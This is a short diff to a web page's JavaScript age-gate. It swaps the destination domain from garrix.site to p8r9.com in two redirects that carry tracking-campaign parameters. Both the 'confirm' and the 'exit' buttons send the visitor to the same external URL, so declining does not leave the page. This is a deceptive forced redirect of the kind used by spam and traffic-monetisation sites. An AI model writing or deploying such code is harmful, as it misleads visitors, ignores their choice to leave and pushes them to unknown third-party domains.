@@ -62,13 +62,13 @@ document.addEventListener('DOMContentLoaded', () => {
     document.body.style.overflow = 'hidden';
 
     confirmBtn.addEventListener('click', () => {
-      window.location.href = 'https://garrix.site/?utm_campaign=sfYFroAwL6&v1=[v1]&v2=[v2]&v3=[v3]';
+      window.location.href = 'https://p8r9.com/?utm_campaign=sfYFroAwL6&v1=[v1]&v2=[v2]&v3=[v3]';
       ageModal.style.display = 'none';
       document.body.style.overflow = 'auto';
     });
 
     exitBtn.addEventListener('click', () => {
-      window.location.href = 'https://garrix.site/?utm_campaign=sfYFroAwL6&v1=[v1]&v2=[v2]&v3=[v3]';
+      window.location.href = 'https://p8r9.com/?utm_campaign=sfYFroAwL6&v1=[v1]&v2=[v2]&v3=[v3]';
     });
   }
 });
